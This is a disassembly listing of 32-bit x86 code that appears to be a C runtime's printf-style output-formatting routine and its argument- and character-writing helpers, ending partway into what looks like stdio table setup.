  4025ea:	74 70                	je     0x40265c
  4025ec:	48                   	dec    %eax
  4025ed:	48                   	dec    %eax
  4025ee:	74 6c                	je     0x40265c
  4025f0:	83 e8 0c             	sub    $0xc,%eax
  4025f3:	0f 85 1e 04 00 00    	jne    0x402a17
  4025f9:	66 f7 45 fc 30 08    	testw  $0x830,-0x4(%ebp)
  4025ff:	75 03                	jne    0x402604
  402601:	09 7d fc             	or     %edi,-0x4(%ebp)
  402604:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
  402608:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  40260d:	74 03                	je     0x402612
  40260f:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402612:	8d 45 10             	lea    0x10(%ebp),%eax
  402615:	50                   	push   %eax
  402616:	e8 e4 05 00 00       	call   0x402bff
  40261b:	66 f7 45 fc 10 08    	testw  $0x810,-0x4(%ebp)
  402621:	59                   	pop    %ecx
  402622:	8b c8                	mov    %eax,%ecx
  402624:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402627:	0f 84 1a 02 00 00    	je     0x402847
  40262d:	85 c9                	test   %ecx,%ecx
  40262f:	75 09                	jne    0x40263a
  402631:	8b 0d 7c 92 40 00    	mov    0x40927c,%ecx
  402637:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40263a:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  402641:	8b c1                	mov    %ecx,%eax
  402643:	8b d6                	mov    %esi,%edx
  402645:	4e                   	dec    %esi
  402646:	85 d2                	test   %edx,%edx
  402648:	0f 84 f0 01 00 00    	je     0x40283e
  40264e:	66 83 38 00          	cmpw   $0x0,(%eax)
  402652:	0f 84 e6 01 00 00    	je     0x40283e
  402658:	40                   	inc    %eax
  402659:	40                   	inc    %eax
  40265a:	eb e7                	jmp    0x402643
  40265c:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  402663:	80 c3 20             	add    $0x20,%bl
  402666:	83 4d fc 40          	orl    $0x40,-0x4(%ebp)
  40266a:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40266e:	8d bd b4 fd ff ff    	lea    -0x24c(%ebp),%edi
  402674:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402677:	0f 8d cd 00 00 00    	jge    0x40274a
  40267d:	c7 45 f8 06 00 00 00 	movl   $0x6,-0x8(%ebp)
  402684:	e9 06 01 00 00       	jmp    0x40278f
  402689:	66 f7 45 fc 30 08    	testw  $0x830,-0x4(%ebp)
  40268f:	75 03                	jne    0x402694
  402691:	09 7d fc             	or     %edi,-0x4(%ebp)
  402694:	66 f7 45 fc 10 08    	testw  $0x810,-0x4(%ebp)
  40269a:	8d 45 10             	lea    0x10(%ebp),%eax
  40269d:	50                   	push   %eax
  40269e:	74 3b                	je     0x4026db
  4026a0:	e8 77 05 00 00       	call   0x402c1c
  4026a5:	50                   	push   %eax
  4026a6:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  4026ac:	50                   	push   %eax
  4026ad:	e8 69 1b 00 00       	call   0x40421b
  4026b2:	83 c4 0c             	add    $0xc,%esp
  4026b5:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4026b8:	85 c0                	test   %eax,%eax
  4026ba:	7d 32                	jge    0x4026ee
  4026bc:	c7 45 c8 01 00 00 00 	movl   $0x1,-0x38(%ebp)
  4026c3:	eb 29                	jmp    0x4026ee
  4026c5:	83 e8 5a             	sub    $0x5a,%eax
  4026c8:	74 32                	je     0x4026fc
  4026ca:	83 e8 09             	sub    $0x9,%eax
  4026cd:	74 c5                	je     0x402694
  4026cf:	48                   	dec    %eax
  4026d0:	0f 84 02 02 00 00    	je     0x4028d8
  4026d6:	e9 3c 03 00 00       	jmp    0x402a17
  4026db:	e8 1f 05 00 00       	call   0x402bff
  4026e0:	59                   	pop    %ecx
  4026e1:	88 85 b4 fd ff ff    	mov    %al,-0x24c(%ebp)
  4026e7:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4026ee:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  4026f4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4026f7:	e9 1b 03 00 00       	jmp    0x402a17
  4026fc:	8d 45 10             	lea    0x10(%ebp),%eax
  4026ff:	50                   	push   %eax
  402700:	e8 fa 04 00 00       	call   0x402bff
  402705:	85 c0                	test   %eax,%eax
  402707:	59                   	pop    %ecx
  402708:	74 32                	je     0x40273c
  40270a:	8b 48 04             	mov    0x4(%eax),%ecx
  40270d:	85 c9                	test   %ecx,%ecx
  40270f:	74 2b                	je     0x40273c
  402711:	85 7d fc             	test   %edi,-0x4(%ebp)
  402714:	74 17                	je     0x40272d
  402716:	0f bf 00             	movswl (%eax),%eax
  402719:	d1 e8                	shr    $1,%eax
  40271b:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40271e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402721:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  402728:	e9 ea 02 00 00       	jmp    0x402a17
  40272d:	83 65 d4 00          	andl   $0x0,-0x2c(%ebp)
  402731:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402734:	0f bf 00             	movswl (%eax),%eax
  402737:	e9 d8 02 00 00       	jmp    0x402a14
  40273c:	a1 78 92 40 00       	mov    0x409278,%eax
  402741:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402744:	50                   	push   %eax
  402745:	e9 aa 00 00 00       	jmp    0x4027f4
  40274a:	75 0e                	jne    0x40275a
  40274c:	80 fb 67             	cmp    $0x67,%bl
  40274f:	75 3e                	jne    0x40278f
  402751:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  402758:	eb 35                	jmp    0x40278f
  40275a:	39 55 f8             	cmp    %edx,-0x8(%ebp)
  40275d:	7e 03                	jle    0x402762
  40275f:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402762:	81 7d f8 a3 00 00 00 	cmpl   $0xa3,-0x8(%ebp)
  402769:	7e 24                	jle    0x40278f
  40276b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40276e:	05 5d 01 00 00       	add    $0x15d,%eax
  402773:	50                   	push   %eax
  402774:	e8 47 19 00 00       	call   0x4040c0
  402779:	85 c0                	test   %eax,%eax
  40277b:	59                   	pop    %ecx
  40277c:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40277f:	74 07                	je     0x402788
  402781:	8b f8                	mov    %eax,%edi
  402783:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402786:	eb 07                	jmp    0x40278f
  402788:	c7 45 f8 a3 00 00 00 	movl   $0xa3,-0x8(%ebp)
  40278f:	8b 45 10             	mov    0x10(%ebp),%eax
  402792:	ff 75 c0             	push   -0x40(%ebp)
  402795:	83 c0 08             	add    $0x8,%eax
  402798:	89 45 10             	mov    %eax,0x10(%ebp)
  40279b:	ff 75 f8             	push   -0x8(%ebp)
  40279e:	8b 48 f8             	mov    -0x8(%eax),%ecx
  4027a1:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4027a4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4027a7:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4027aa:	0f be c3             	movsbl %bl,%eax
  4027ad:	50                   	push   %eax
  4027ae:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4027b1:	57                   	push   %edi
  4027b2:	50                   	push   %eax
  4027b3:	ff 15 40 96 40 00    	call   *0x409640
  4027b9:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4027bc:	83 c4 14             	add    $0x14,%esp
  4027bf:	81 e6 80 00 00 00    	and    $0x80,%esi
  4027c5:	74 0e                	je     0x4027d5
  4027c7:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4027cb:	75 08                	jne    0x4027d5
  4027cd:	57                   	push   %edi
  4027ce:	ff 15 4c 96 40 00    	call   *0x40964c
  4027d4:	59                   	pop    %ecx
  4027d5:	80 fb 67             	cmp    $0x67,%bl
  4027d8:	75 0c                	jne    0x4027e6
  4027da:	85 f6                	test   %esi,%esi
  4027dc:	75 08                	jne    0x4027e6
  4027de:	57                   	push   %edi
  4027df:	ff 15 44 96 40 00    	call   *0x409644
  4027e5:	59                   	pop    %ecx
  4027e6:	80 3f 2d             	cmpb   $0x2d,(%edi)
  4027e9:	75 08                	jne    0x4027f3
  4027eb:	80 4d fd 01          	orb    $0x1,-0x3(%ebp)
  4027ef:	47                   	inc    %edi
  4027f0:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4027f3:	57                   	push   %edi
  4027f4:	e8 a7 19 00 00       	call   0x4041a0
  4027f9:	59                   	pop    %ecx
  4027fa:	e9 15 02 00 00       	jmp    0x402a14
  4027ff:	83 e8 69             	sub    $0x69,%eax
  402802:	0f 84 d0 00 00 00    	je     0x4028d8
  402808:	83 e8 05             	sub    $0x5,%eax
  40280b:	0f 84 9d 00 00 00    	je     0x4028ae
  402811:	48                   	dec    %eax
  402812:	0f 84 84 00 00 00    	je     0x40289c
  402818:	48                   	dec    %eax
  402819:	74 51                	je     0x40286c
  40281b:	83 e8 03             	sub    $0x3,%eax
  40281e:	0f 84 e0 fd ff ff    	je     0x402604
  402824:	48                   	dec    %eax
  402825:	48                   	dec    %eax
  402826:	0f 84 b0 00 00 00    	je     0x4028dc
  40282c:	83 e8 03             	sub    $0x3,%eax
  40282f:	0f 85 e2 01 00 00    	jne    0x402a17
  402835:	c7 45 cc 27 00 00 00 	movl   $0x27,-0x34(%ebp)
  40283c:	eb 3c                	jmp    0x40287a
  40283e:	2b c1                	sub    %ecx,%eax
  402840:	d1 f8                	sar    $1,%eax
  402842:	e9 cd 01 00 00       	jmp    0x402a14
  402847:	85 c9                	test   %ecx,%ecx
  402849:	75 09                	jne    0x402854
  40284b:	8b 0d 78 92 40 00    	mov    0x409278,%ecx
  402851:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402854:	8b c1                	mov    %ecx,%eax
  402856:	8b d6                	mov    %esi,%edx
  402858:	4e                   	dec    %esi
  402859:	85 d2                	test   %edx,%edx
  40285b:	74 08                	je     0x402865
  40285d:	80 38 00             	cmpb   $0x0,(%eax)
  402860:	74 03                	je     0x402865
  402862:	40                   	inc    %eax
  402863:	eb f1                	jmp    0x402856
  402865:	2b c1                	sub    %ecx,%eax
  402867:	e9 a8 01 00 00       	jmp    0x402a14
  40286c:	c7 45 f8 08 00 00 00 	movl   $0x8,-0x8(%ebp)
  402873:	c7 45 cc 07 00 00 00 	movl   $0x7,-0x34(%ebp)
  40287a:	f6 45 fc 80          	testb  $0x80,-0x4(%ebp)
  40287e:	c7 45 f0 10 00 00 00 	movl   $0x10,-0x10(%ebp)
  402885:	74 5c                	je     0x4028e3
  402887:	8a 45 cc             	mov    -0x34(%ebp),%al
  40288a:	c6 45 ea 30          	movb   $0x30,-0x16(%ebp)
  40288e:	04 51                	add    $0x51,%al
  402890:	c7 45 dc 02 00 00 00 	movl   $0x2,-0x24(%ebp)
  402897:	88 45 eb             	mov    %al,-0x15(%ebp)
  40289a:	eb 47                	jmp    0x4028e3
  40289c:	f6 45 fc 80          	testb  $0x80,-0x4(%ebp)
  4028a0:	c7 45 f0 08 00 00 00 	movl   $0x8,-0x10(%ebp)
  4028a7:	74 3a                	je     0x4028e3
  4028a9:	09 55 fc             	or     %edx,-0x4(%ebp)
  4028ac:	eb 35                	jmp    0x4028e3
  4028ae:	8d 45 10             	lea    0x10(%ebp),%eax
  4028b1:	50                   	push   %eax
  4028b2:	e8 48 03 00 00       	call   0x402bff
  4028b7:	f6 45 fc 20          	testb  $0x20,-0x4(%ebp)
  4028bb:	59                   	pop    %ecx
  4028bc:	74 09                	je     0x4028c7
  4028be:	66 8b 4d ec          	mov    -0x14(%ebp),%cx
  4028c2:	66 89 08             	mov    %cx,(%eax)
  4028c5:	eb 05                	jmp    0x4028cc
  4028c7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4028ca:	89 08                	mov    %ecx,(%eax)
  4028cc:	c7 45 c8 01 00 00 00 	movl   $0x1,-0x38(%ebp)
  4028d3:	e9 3d 02 00 00       	jmp    0x402b15
  4028d8:	83 4d fc 40          	orl    $0x40,-0x4(%ebp)
  4028dc:	c7 45 f0 0a 00 00 00 	movl   $0xa,-0x10(%ebp)
  4028e3:	f6 45 fd 80          	testb  $0x80,-0x3(%ebp)
  4028e7:	74 0c                	je     0x4028f5
  4028e9:	8d 45 10             	lea    0x10(%ebp),%eax
  4028ec:	50                   	push   %eax
  4028ed:	e8 1a 03 00 00       	call   0x402c0c
  4028f2:	59                   	pop    %ecx
  4028f3:	eb 41                	jmp    0x402936
  4028f5:	f6 45 fc 20          	testb  $0x20,-0x4(%ebp)
  4028f9:	74 21                	je     0x40291c
  4028fb:	f6 45 fc 40          	testb  $0x40,-0x4(%ebp)
  4028ff:	8d 45 10             	lea    0x10(%ebp),%eax
  402902:	50                   	push   %eax
  402903:	74 0c                	je     0x402911
  402905:	e8 f5 02 00 00       	call   0x402bff
  40290a:	59                   	pop    %ecx
  40290b:	0f bf c0             	movswl %ax,%eax
  40290e:	99                   	cltd
  40290f:	eb 25                	jmp    0x402936
  402911:	e8 e9 02 00 00       	call   0x402bff
  402916:	59                   	pop    %ecx
  402917:	0f b7 c0             	movzwl %ax,%eax
  40291a:	eb f2                	jmp    0x40290e
  40291c:	f6 45 fc 40          	testb  $0x40,-0x4(%ebp)
  402920:	8d 45 10             	lea    0x10(%ebp),%eax
  402923:	50                   	push   %eax
  402924:	74 08                	je     0x40292e
  402926:	e8 d4 02 00 00       	call   0x402bff
  40292b:	59                   	pop    %ecx
  40292c:	eb e0                	jmp    0x40290e
  40292e:	e8 cc 02 00 00       	call   0x402bff
  402933:	59                   	pop    %ecx
  402934:	33 d2                	xor    %edx,%edx
  402936:	f6 45 fc 40          	testb  $0x40,-0x4(%ebp)
  40293a:	74 1d                	je     0x402959
  40293c:	85 d2                	test   %edx,%edx
  40293e:	7f 19                	jg     0x402959
  402940:	7c 04                	jl     0x402946
  402942:	85 c0                	test   %eax,%eax
  402944:	73 13                	jae    0x402959
  402946:	f7 d8                	neg    %eax
  402948:	83 d2 00             	adc    $0x0,%edx
  40294b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40294e:	f7 da                	neg    %edx
  402950:	80 4d fd 01          	orb    $0x1,-0x3(%ebp)
  402954:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  402957:	eb 06                	jmp    0x40295f
  402959:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40295c:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40295f:	f6 45 fd 80          	testb  $0x80,-0x3(%ebp)
  402963:	75 04                	jne    0x402969
  402965:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  402969:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40296d:	7d 09                	jge    0x402978
  40296f:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  402976:	eb 11                	jmp    0x402989
  402978:	83 65 fc f7          	andl   $0xfffffff7,-0x4(%ebp)
  40297c:	b8 00 02 00 00       	mov    $0x200,%eax
  402981:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  402984:	7e 03                	jle    0x402989
  402986:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402989:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40298c:	0b 45 e4             	or     -0x1c(%ebp),%eax
  40298f:	75 04                	jne    0x402995
  402991:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  402995:	8d 45 b3             	lea    -0x4d(%ebp),%eax
  402998:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40299b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40299e:	ff 4d f8             	decl   -0x8(%ebp)
  4029a1:	85 c0                	test   %eax,%eax
  4029a3:	7f 08                	jg     0x4029ad
  4029a5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4029a8:	0b 45 e4             	or     -0x1c(%ebp),%eax
  4029ab:	74 3f                	je     0x4029ec
  4029ad:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4029b0:	99                   	cltd
  4029b1:	8b fa                	mov    %edx,%edi
  4029b3:	8b f0                	mov    %eax,%esi
  4029b5:	57                   	push   %edi
  4029b6:	56                   	push   %esi
  4029b7:	ff 75 e4             	push   -0x1c(%ebp)
  4029ba:	ff 75 e0             	push   -0x20(%ebp)
  4029bd:	e8 3e 19 00 00       	call   0x404300
  4029c2:	57                   	push   %edi
  4029c3:	56                   	push   %esi
  4029c4:	ff 75 e4             	push   -0x1c(%ebp)
  4029c7:	8b d8                	mov    %eax,%ebx
  4029c9:	83 c3 30             	add    $0x30,%ebx
  4029cc:	ff 75 e0             	push   -0x20(%ebp)
  4029cf:	e8 bc 18 00 00       	call   0x404290
  4029d4:	83 fb 39             	cmp    $0x39,%ebx
  4029d7:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4029da:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4029dd:	7e 03                	jle    0x4029e2
  4029df:	03 5d cc             	add    -0x34(%ebp),%ebx
  4029e2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4029e5:	ff 4d f4             	decl   -0xc(%ebp)
  4029e8:	88 18                	mov    %bl,(%eax)
  4029ea:	eb af                	jmp    0x40299b
  4029ec:	8d 45 b3             	lea    -0x4d(%ebp),%eax
  4029ef:	2b 45 f4             	sub    -0xc(%ebp),%eax
  4029f2:	ff 45 f4             	incl   -0xc(%ebp)
  4029f5:	f6 45 fd 02          	testb  $0x2,-0x3(%ebp)
  4029f9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4029fc:	74 19                	je     0x402a17
  4029fe:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402a01:	80 39 30             	cmpb   $0x30,(%ecx)
  402a04:	75 04                	jne    0x402a0a
  402a06:	85 c0                	test   %eax,%eax
  402a08:	75 0d                	jne    0x402a17
  402a0a:	ff 4d f4             	decl   -0xc(%ebp)
  402a0d:	40                   	inc    %eax
  402a0e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402a11:	c6 01 30             	movb   $0x30,(%ecx)
  402a14:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402a17:	83 7d c8 00          	cmpl   $0x0,-0x38(%ebp)
  402a1b:	0f 85 f4 00 00 00    	jne    0x402b15
  402a21:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402a24:	f6 c3 40             	test   $0x40,%bl
  402a27:	74 26                	je     0x402a4f
  402a29:	f6 c7 01             	test   $0x1,%bh
  402a2c:	74 06                	je     0x402a34
  402a2e:	c6 45 ea 2d          	movb   $0x2d,-0x16(%ebp)
  402a32:	eb 14                	jmp    0x402a48
  402a34:	f6 c3 01             	test   $0x1,%bl
  402a37:	74 06                	je     0x402a3f
  402a39:	c6 45 ea 2b          	movb   $0x2b,-0x16(%ebp)
  402a3d:	eb 09                	jmp    0x402a48
  402a3f:	f6 c3 02             	test   $0x2,%bl
  402a42:	74 0b                	je     0x402a4f
  402a44:	c6 45 ea 20          	movb   $0x20,-0x16(%ebp)
  402a48:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  402a4f:	8b 75 d8             	mov    -0x28(%ebp),%esi
  402a52:	2b 75 dc             	sub    -0x24(%ebp),%esi
  402a55:	2b 75 f0             	sub    -0x10(%ebp),%esi
  402a58:	f6 c3 0c             	test   $0xc,%bl
  402a5b:	75 12                	jne    0x402a6f
  402a5d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402a60:	50                   	push   %eax
  402a61:	ff 75 08             	push   0x8(%ebp)
  402a64:	56                   	push   %esi
  402a65:	6a 20                	push   $0x20
  402a67:	e8 2a 01 00 00       	call   0x402b96
  402a6c:	83 c4 10             	add    $0x10,%esp
  402a6f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402a72:	50                   	push   %eax
  402a73:	8d 45 ea             	lea    -0x16(%ebp),%eax
  402a76:	ff 75 08             	push   0x8(%ebp)
  402a79:	ff 75 dc             	push   -0x24(%ebp)
  402a7c:	50                   	push   %eax
  402a7d:	e8 45 01 00 00       	call   0x402bc7
  402a82:	83 c4 10             	add    $0x10,%esp
  402a85:	f6 c3 08             	test   $0x8,%bl
  402a88:	74 17                	je     0x402aa1
  402a8a:	f6 c3 04             	test   $0x4,%bl
  402a8d:	75 12                	jne    0x402aa1
  402a8f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402a92:	50                   	push   %eax
  402a93:	ff 75 08             	push   0x8(%ebp)
  402a96:	56                   	push   %esi
  402a97:	6a 30                	push   $0x30
  402a99:	e8 f8 00 00 00       	call   0x402b96
  402a9e:	83 c4 10             	add    $0x10,%esp
  402aa1:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  402aa5:	74 41                	je     0x402ae8
  402aa7:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  402aab:	7e 3b                	jle    0x402ae8
  402aad:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402ab0:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  402ab3:	8d 78 ff             	lea    -0x1(%eax),%edi
  402ab6:	66 8b 03             	mov    (%ebx),%ax
  402ab9:	43                   	inc    %ebx
  402aba:	50                   	push   %eax
  402abb:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402abe:	50                   	push   %eax
  402abf:	43                   	inc    %ebx
  402ac0:	e8 56 17 00 00       	call   0x40421b
  402ac5:	59                   	pop    %ecx
  402ac6:	85 c0                	test   %eax,%eax
  402ac8:	59                   	pop    %ecx
  402ac9:	7e 32                	jle    0x402afd
  402acb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402ace:	51                   	push   %ecx
  402acf:	ff 75 08             	push   0x8(%ebp)
  402ad2:	50                   	push   %eax
  402ad3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402ad6:	50                   	push   %eax
  402ad7:	e8 eb 00 00 00       	call   0x402bc7
  402adc:	83 c4 10             	add    $0x10,%esp
  402adf:	8b c7                	mov    %edi,%eax
  402ae1:	4f                   	dec    %edi
  402ae2:	85 c0                	test   %eax,%eax
  402ae4:	75 d0                	jne    0x402ab6
  402ae6:	eb 15                	jmp    0x402afd
  402ae8:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402aeb:	50                   	push   %eax
  402aec:	ff 75 08             	push   0x8(%ebp)
  402aef:	ff 75 f0             	push   -0x10(%ebp)
  402af2:	ff 75 f4             	push   -0xc(%ebp)
  402af5:	e8 cd 00 00 00       	call   0x402bc7
  402afa:	83 c4 10             	add    $0x10,%esp
  402afd:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  402b01:	74 12                	je     0x402b15
  402b03:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402b06:	50                   	push   %eax
  402b07:	ff 75 08             	push   0x8(%ebp)
  402b0a:	56                   	push   %esi
  402b0b:	6a 20                	push   $0x20
  402b0d:	e8 84 00 00 00       	call   0x402b96
  402b12:	83 c4 10             	add    $0x10,%esp
  402b15:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  402b19:	74 0d                	je     0x402b28
  402b1b:	ff 75 d0             	push   -0x30(%ebp)
  402b1e:	e8 29 07 00 00       	call   0x40324c
  402b23:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  402b27:	59                   	pop    %ecx
  402b28:	8b 75 0c             	mov    0xc(%ebp),%esi
  402b2b:	8a 1e                	mov    (%esi),%bl
  402b2d:	46                   	inc    %esi
  402b2e:	84 db                	test   %bl,%bl
  402b30:	89 75 0c             	mov    %esi,0xc(%ebp)
  402b33:	0f 85 be f8 ff ff    	jne    0x4023f7
  402b39:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402b3c:	5f                   	pop    %edi
  402b3d:	5e                   	pop    %esi
  402b3e:	5b                   	pop    %ebx
  402b3f:	c9                   	leave
  402b40:	c3                   	ret
  402b41:	76 25                	jbe    0x402b68
  402b43:	40                   	inc    %eax
  402b44:	00 46 24             	add    %al,0x24(%esi)
  402b47:	40                   	inc    %eax
  402b48:	00 63 24             	add    %ah,0x24(%ebx)
  402b4b:	40                   	inc    %eax
  402b4c:	00 af 24 40 00 e6    	add    %ch,-0x19ffbfdc(%edi)
  402b52:	24 40                	and    $0x40,%al
  402b54:	00 ef                	add    %ch,%bh
  402b56:	24 40                	and    $0x40,%al
  402b58:	00 27                	add    %ah,(%edi)
  402b5a:	25 40 00 bb 25       	and    $0x25bb0040,%eax
  402b5f:	40                   	inc    %eax
  402b60:	00 55 8b             	add    %dl,-0x75(%ebp)
  402b63:	ec                   	in     (%dx),%al
  402b64:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402b67:	ff 49 04             	decl   0x4(%ecx)
  402b6a:	78 0e                	js     0x402b7a
  402b6c:	8b 11                	mov    (%ecx),%edx
  402b6e:	8a 45 08             	mov    0x8(%ebp),%al
  402b71:	88 02                	mov    %al,(%edx)
  402b73:	ff 01                	incl   (%ecx)
  402b75:	0f b6 c0             	movzbl %al,%eax
  402b78:	eb 0b                	jmp    0x402b85
  402b7a:	51                   	push   %ecx
  402b7b:	ff 75 08             	push   0x8(%ebp)
  402b7e:	e8 b4 05 00 00       	call   0x403137
  402b83:	59                   	pop    %ecx
  402b84:	59                   	pop    %ecx
  402b85:	83 f8 ff             	cmp    $0xffffffff,%eax
  402b88:	8b 45 10             	mov    0x10(%ebp),%eax
  402b8b:	75 05                	jne    0x402b92
  402b8d:	83 08 ff             	orl    $0xffffffff,(%eax)
  402b90:	5d                   	pop    %ebp
  402b91:	c3                   	ret
  402b92:	ff 00                	incl   (%eax)
  402b94:	5d                   	pop    %ebp
  402b95:	c3                   	ret
  402b96:	56                   	push   %esi
  402b97:	57                   	push   %edi
  402b98:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402b9c:	8b c7                	mov    %edi,%eax
  402b9e:	4f                   	dec    %edi
  402b9f:	85 c0                	test   %eax,%eax
  402ba1:	7e 21                	jle    0x402bc4
  402ba3:	8b 74 24 18          	mov    0x18(%esp),%esi
  402ba7:	56                   	push   %esi
  402ba8:	ff 74 24 18          	push   0x18(%esp)
  402bac:	ff 74 24 14          	push   0x14(%esp)
  402bb0:	e8 ac ff ff ff       	call   0x402b61
  402bb5:	83 c4 0c             	add    $0xc,%esp
  402bb8:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  402bbb:	74 07                	je     0x402bc4
  402bbd:	8b c7                	mov    %edi,%eax
  402bbf:	4f                   	dec    %edi
  402bc0:	85 c0                	test   %eax,%eax
  402bc2:	7f e3                	jg     0x402ba7
  402bc4:	5f                   	pop    %edi
  402bc5:	5e                   	pop    %esi
  402bc6:	c3                   	ret
  402bc7:	53                   	push   %ebx
  402bc8:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  402bcc:	8b c3                	mov    %ebx,%eax
  402bce:	4b                   	dec    %ebx
  402bcf:	56                   	push   %esi
  402bd0:	57                   	push   %edi
  402bd1:	85 c0                	test   %eax,%eax
  402bd3:	7e 26                	jle    0x402bfb
  402bd5:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  402bd9:	8b 74 24 10          	mov    0x10(%esp),%esi
  402bdd:	0f be 06             	movsbl (%esi),%eax
  402be0:	57                   	push   %edi
  402be1:	46                   	inc    %esi
  402be2:	ff 74 24 1c          	push   0x1c(%esp)
  402be6:	50                   	push   %eax
  402be7:	e8 75 ff ff ff       	call   0x402b61
  402bec:	83 c4 0c             	add    $0xc,%esp
  402bef:	83 3f ff             	cmpl   $0xffffffff,(%edi)
  402bf2:	74 07                	je     0x402bfb
  402bf4:	8b c3                	mov    %ebx,%eax
  402bf6:	4b                   	dec    %ebx
  402bf7:	85 c0                	test   %eax,%eax
  402bf9:	7f e2                	jg     0x402bdd
  402bfb:	5f                   	pop    %edi
  402bfc:	5e                   	pop    %esi
  402bfd:	5b                   	pop    %ebx
  402bfe:	c3                   	ret
  402bff:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c03:	83 00 04             	addl   $0x4,(%eax)
  402c06:	8b 00                	mov    (%eax),%eax
  402c08:	8b 40 fc             	mov    -0x4(%eax),%eax
  402c0b:	c3                   	ret
  402c0c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c10:	83 00 08             	addl   $0x8,(%eax)
  402c13:	8b 08                	mov    (%eax),%ecx
  402c15:	8b 41 f8             	mov    -0x8(%ecx),%eax
  402c18:	8b 51 fc             	mov    -0x4(%ecx),%edx
  402c1b:	c3                   	ret
  402c1c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c20:	83 00 04             	addl   $0x4,(%eax)
  402c23:	8b 00                	mov    (%eax),%eax
  402c25:	66 8b 40 fc          	mov    -0x4(%eax),%ax
  402c29:	c3                   	ret
  402c2a:	a1 00 d3 40 00       	mov    0x40d300,%eax
  402c2f:	56                   	push   %esi
  402c30:	6a 14                	push   $0x14
  402c32:	85 c0                	test   %eax,%eax
  402c34:	5e                   	pop    %esi
  402c35:	75 07                	jne    0x402c3e
  402c37:	b8 00 02 00 00       	mov    $0x200,%eax
  402c3c:	eb 06                	jmp    0x402c44
  402c3e:	3b c6                	cmp    %esi,%eax
  402c40:	7d 07                	jge    0x402c49
  402c42:	8b c6                	mov    %esi,%eax
  402c44:	a3 00 d3 40 00       	mov    %eax,0x40d300
  402c49:	6a 04                	push   $0x4
  402c4b:	50                   	push   %eax
  402c4c:	e8 24 17 00 00       	call   0x404375
  402c51:	59                   	pop    %ecx
  402c52:	a3 f8 c2 40 00       	mov    %eax,0x40c2f8
  402c57:	85 c0                	test   %eax,%eax
